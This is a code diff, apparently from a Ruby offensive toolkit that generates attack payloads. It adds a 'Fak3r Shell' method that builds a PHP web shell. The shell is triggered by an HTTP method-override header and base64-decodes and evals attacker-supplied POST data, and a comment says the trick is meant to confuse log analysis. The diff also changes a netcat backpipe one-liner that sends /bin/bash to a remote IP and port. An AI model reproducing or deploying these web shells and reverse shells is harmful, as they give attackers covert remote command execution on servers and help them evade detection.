@@ -201,6 +201,16 @@ $_[$__+ $__] ;$_[@-_]($_[@!+_] ); ?>'
     return fname, php_shell
   end
 
+  # Fak3r Shell
+  # By: HR & Join7
+  # The 'HTTP_X_HTTP_METHOD_OVERRIDE' Header will register as one thing with Apache/Nginx
+  # and soemthing completely different is seen and handled by PHP. Can cause some confusion on log side ;)
+  def fak3r_shell
+    fname = randz(9) + '.php'
+    php_shell = "<?php if (isset($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'])) { $req_method = $_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE']; parse_str(file_get_contents(\"php://input\"),$post_vars); $cmd = $post_vars['_']; eval(base64_decode($cmd)); } ?>"
+    return fname, php_shell
+  end
+
   # Simple PHP Uploader Script
   # Returns prepped payload and filename
   def php_uploader
@@ -282,7 +292,7 @@ session_start(); ?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN
   # Turns traditional Netcat into useful netcat :)
   # Leaves 'backpip' behind when done, remind user to delete if used to keep safe....
   def backpipe_reverse_oneliner(ip, port)
-    rev_str = "mknod backpipe p && nc #{ip} #{port.to_i} 0<backpipe | /bin/bash 1>backpipe"
+    rev_str = "cd /tmp && mknod backpipe p && nc #{ip} #{port.to_i} 0<backpipe | /bin/bash 1>backpipe"
     return rev_str
   end
 
